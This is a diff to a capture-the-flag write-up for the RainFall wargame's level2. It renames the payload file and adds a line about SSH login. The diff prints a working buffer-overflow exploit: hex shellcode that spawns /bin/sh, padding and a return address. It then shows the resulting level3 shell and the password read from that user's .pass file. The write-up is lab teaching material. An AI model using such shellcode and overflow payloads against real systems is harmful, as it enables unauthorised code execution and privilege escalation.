@@ -201,8 +201,8 @@ exploit = payload + "A" * (80 - 21) + return_address
 
 We use Python to generate the exploit and save it to a file:
 
-```python
-python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21)  +  "\x08\xa0\x04\x08"' > /tmp/payloadlvl2
+```shell
+level2@RainFall:~$ python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21)  +  "\x08\xa0\x04\x08"' > /tmp/exploit2
 ```
 
 ## Running the Exploit
@@ -212,7 +212,7 @@ interactive terminal to work properly. Once we run our exploit successfully, we 
 that the shell is running as the `level3` user.
 
 ```shell
-level2@RainFall:~$ cat /tmp/exploitlvl2 - | ./level2
+level2@RainFall:~$ cat /tmp/exploit2 - | ./level2
 j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 whoami
@@ -227,3 +227,5 @@ Finally, we can read the `.pass` file of `level3` to complete the level.
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
+We can now log in via SSH as the `level3` user using the password we just found.
